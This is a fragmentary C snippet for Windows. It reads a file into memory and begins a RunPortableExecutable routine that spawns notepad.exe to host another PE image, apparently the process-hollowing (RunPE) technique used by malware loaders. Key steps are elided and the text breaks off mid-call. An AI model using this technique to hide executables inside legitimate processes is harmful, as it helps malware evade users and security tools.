...
char* CreateBuffFromFileA(wchar_t* fname,OUT PDWORD bufsize) //DO NOT FORGET TO FREE UP MEMORY!!!
{
	HANDLE hf = CreateFileW(fname,GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);

	if ((hf <= 0) || hf == (HANDLE)INVALID_FILE_SIZE)  return 0;//
	DWORD siz = GetFileSize(hf,0);
	char* resbuff = (char*)malloc((siz+1)*sizeof(char));
	ZeroMemory( resbuff, (siz+1)*sizeof(char) );
	if (bufsize) 
		*bufsize = siz;
	DWORD rdn;
	ReadFile(hf, resbuff, siz, &rdn, 0);
	CloseHandle(hf);
	return resbuff;
}
...
int RunPortableExecutable(void* Image)
{
	...
	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) // Check if image is a PE File.
	{
		...
		if (CreateProcessA("c:\\windows\\system32\\notepad.exe"/*CurrentFilePath*/, NULL, NULL, NULL, FALSE,
